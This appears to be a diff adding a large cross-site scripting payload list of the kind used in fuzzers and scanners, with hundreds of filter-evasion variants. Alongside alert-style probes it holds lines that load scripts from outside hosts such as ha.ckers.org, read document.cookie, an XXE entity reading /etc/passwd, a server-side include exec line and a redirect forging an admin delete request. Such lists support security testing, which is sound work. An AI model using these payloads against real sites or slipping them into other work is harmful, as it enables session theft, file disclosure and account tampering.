+<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<object onerror=javascript:javascript:alert(1)>
+"`'><script>\x7Ejavascript:alert(1)</script>
+<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
+<TABLE BACKGROUND="javascript:javascript:alert(1)">
+0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+<img/src=@&#32;&#13; onerror = prompt('&#49;')
+</plaintext\></|\><plaintext/onmouseover=prompt(1)
+<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"><img src=x onerror=javascript:alert((`A`))>
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<div style="width: expression(document.vulnerable=true;);">
+<img src onerror /" '"= alt=javascript:alert(1)//">
+>"><script>alert("XSS")</script>&
+<![<!--]]<script>document.vulnerable=true;//--></script>
+<iframe// src=javaSCRIPT&colon;alert(1)
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<script>+-+-1-+-+alert(1)</script>
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
+<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
+<img \x47src=x onerror="javascript:alert(1)">
+<IMG SRC=x onmouseout="alert(String.fromCharCode(88,83,83))">
+<IMG SRC="livescript:[code]">
+<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+<IMG SRC="javascript:javascript:alert(1);">
+<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<event-source src="%(event)s" onload="javascript:alert(1)">
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
+&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<div/onmouseover='alert(1)'> style="x:">
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+<img/src/onerror="(function(x){this[x+`ert`](1)})`al`">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<img src=xss onerror=alert(1)>
+žscriptualert(EXSSE)ž/scriptu
+<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
+jAvaScripT:(alert)`1`
+http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
+&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
+<IMG DYNSRC="javascript:alert('XSS')">
+</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
+<b <script>alert(1)</script>0
+X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
+themecolor=%22-alert('XSS')-%22
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+<IMG SRC=x oninput="alert(String.fromCharCode(88,83,83))">
+<IMG SRC=x onbeforeunload="alert(String.fromCharCode(88,83,83))">
+ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
+<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
+<svg onload=alert (1337)&nvgt;
+<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
+&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<IMG SRC=x onwaiting="alert(String.fromCharCode(88,83,83))">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<table><TD BACKGROUND="javascript:document.vulnerable=true;">
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+<IMG SRC=javascript:alert(‘XSS’)>      
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
+"><​script>prompt()<​/script>
+<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<video><source onerror="javascript:javascript:alert(1)">
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+&#x0003c;
+&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
+<? foo="><script>javascript:alert(1)</script>">
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
+&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;
+<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
+<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<xml src="javascript:document.vulnerable=true;">
+&lt;SCRIPT&gt;a=/XSS/
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+<SCRIPT SRC=//ha.ckers.org/.j>
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+“><iMg SrC=x onError​=prompt()>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<input value=<><iframe/src=javascript:confirm(1)
+<P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
+<Svg On Only=1 Onload=alert(1)>
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
+<;A HREF=";//google";>;XSS<;/A>;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
+&lt;? echo('&lt;SCR)';
+<XSS STYLE="xss:expression(javascript:alert(1))">
+<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<IMG SRC=x onprogress="alert(String.fromCharCode(88,83,83))">
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+'""><script language="JavaScript"> alert('X \nS \nS');</script>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<svg xmlns="#"><script>alert(1)</script></svg>
+<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+'">><marquee><h1>XSS</h1></marquee>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+javascript:alert%281%29;
+<script\x20>javascript:alert(1)</script>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
+'';!--"<XSS>=&{()}
+<svg><script>//&NewLine;confirm(1);</script </svg>
+"><div onpointerrawupdate="console.log('XSS')">Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_Click_Here_ClickHere</div>
+&#X000003C;
+foo\’; alert(document.cookie);//’;
+<script>%(payload)s</script>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG SRC=x oncopy="alert(String.fromCharCode(88,83,83))">
+&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
+&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
+<img src=``&NewLine; onerror=alert(1)&NewLine;
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
+<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
+<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
+<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
+&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
+<img src\x00=x onerror="javascript:alert(1)">
+<object data="data:text/html;base64,%(base64)s">
+<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+&#x03C;
+url=%26%2302java%26%23115cript:alert(document.domain)
+<script>+-+-1-+-+alert(1)</script>
+<script>javascript:alert(1)</script\x0A
+&#x03c;
+<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
+\";document.vulnerable=true;;//
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<IMG SRC=javascript:alert("XSS")>
+'`"><\x00script>javascript:alert(1)</script>
+<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>alert(1);</script>
+c=\"javascript&#058;\";
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
+foo<script>alert(document.cookie)</script>
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
+<sVg><scRipt >alert&lpar;1&rpar; {Opera}
+<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
+</XSS STYLE=xss:expression(alert('XSS'))>
+&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
+<object onerror=javascript:javascript:alert(1)>
+&#X3c;
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
